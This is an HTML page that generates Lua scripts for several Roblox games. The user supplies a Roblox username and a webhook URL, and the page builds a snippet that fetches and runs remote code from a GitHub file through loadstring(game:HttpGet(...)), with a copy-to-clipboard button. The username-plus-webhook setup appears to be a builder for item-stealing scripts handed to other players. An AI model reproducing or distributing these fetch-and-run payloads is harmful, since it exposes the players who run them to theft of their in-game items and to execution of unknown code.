<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Script Generator</title>
    <style>
        body {
            background: linear-gradient(45deg, #0f0c29, #302b63, #24243e);
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        h1 {
            font-size: 3rem;
            animation: fadeIn 1.5s ease-in-out;
        }
        .container {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 15px;
            margin-top: 20px;
        }
        .game-button {
            background: #ff0080;
            color: white;
            border: none;
            padding: 10px 20px;
            font-size: 1rem;
            border-radius: 10px;
            cursor: pointer;
            transition: transform 0.3s, background 0.3s;
            width: 200px;
        }
        .game-button:hover {
            background: #ff0055;
            transform: scale(1.1);
        }
        .popup {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #1e1e2e;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
            text-align: center;
            max-width: 400px;
            width: 90%;
        }
        .popup input {
            display: block;
            margin: 10px auto;
            padding: 8px;
            width: 80%;
            border-radius: 5px;
            border: 1px solid #ddd;
            background: #2c2c2c;
            color: white;
        }
        .popup button {
            background: #ff0080;
            color: white;
            border: none;
            padding: 10px;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
        }
        .popup button:hover {
            background: #ff0055;
        }
        .script-output {
            background: #222;
            padding: 20px;
            border-radius: 10px;
            color: #00ff00;
            font-family: monospace;
            margin-top: 15px;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        .copy-button {
            background: #00ff00;
            color: black;
            border: none;
            padding: 8px 15px;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
        }
        .copy-button:hover {
            background: #00cc00;
        }
    </style>
</head>
<body>
    <h1>Script Generator</h1>
    <div class="container">
        <button class="game-button" onclick="openPopup('Blox Fruits')">Blox Fruits</button>
        <button class="game-button" onclick="openPopup('Murder Mystery 2')">Murder Mystery 2</button>
        <button class="game-button" onclick="openPopup('Adopt Me')">Adopt Me</button>
        <button class="game-button" onclick="openPopup('Pet Simulator 99')">Pet Simulator 99</button>
        <button class="game-button" onclick="openPopup('Pls Donate')">Pls Donate</button>
    </div>

    <div id="popup" class="popup">
        <h2 id="game-title">Enter Details for Game</h2>
        <input type="text" id="username" placeholder="Enter Roblox Username">
        <input type="text" id="webhook" placeholder="Enter Webhook URL">
        <button onclick="generateScript()">Generate Script</button>
        <button onclick="closePopup()">Close</button>
    </div>

    <div id="scriptOutput" class="script-output" style="display:none;"></div>

    <script>
        let currentGame = '';

        function openPopup(game) {
            currentGame = game;
            document.getElementById('game-title').innerText = `Enter Details for ${game}`;
            document.getElementById('popup').style.display = 'block';
        }

        function closePopup() {
            document.getElementById('popup').style.display = 'none';
        }

        function generateScript() {
            let username = document.getElementById('username').value;
            let webhook = document.getElementById('webhook').value;
            if (username && webhook) {
                let script;
                if (currentGame === 'Blox Fruits') {
                    script = `Username = "${username}"\nWebhook = "${webhook}"\nloadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/refs/heads/main/Bloxfruits'))()`;
                } else if (currentGame === 'Murder Mystery 2') {
                    script = `Username = "${username}"\nWebhook = "${webhook}"\nloadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/refs/heads/main/Void'))()`;
                } else if (currentGame === 'Adopt Me') {
                    script = `Username = "${username}"\nWebhook = "${webhook}"\nloadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/refs/heads/main/Adopt%20me'))()`;
                } else if (currentGame === 'Pet Simulator 99') {
                    script = `Username = "${username}"\nWebhook = "${webhook}"\nloadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/refs/heads/main/Ps99'))()`;
                } else if (currentGame === 'Pls Donate') {
                    script = `Username = "${username}"\nWebhook = "${webhook}"\nloadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/refs/heads/main/Pls%20Donate'))()`;
                }

                document.getElementById('scriptOutput').style.display = 'block';
                document.getElementById('scriptOutput').textContent = script;

                // Display a "Copy" button
                let copyButton = document.createElement('button');
                copyButton.textContent = 'Copy Script';
                copyButton.classList.add('copy-button');
                copyButton.onclick = function() {
                    navigator.clipboard.writeText(script).then(() => {
                        alert('Script copied to clipboard!');
                    });
                };
                document.getElementById('scriptOutput').appendChild(copyButton);

            } else {
                alert("Please enter both a username and webhook.");
            }
        }
    </script>
</body>
</html>
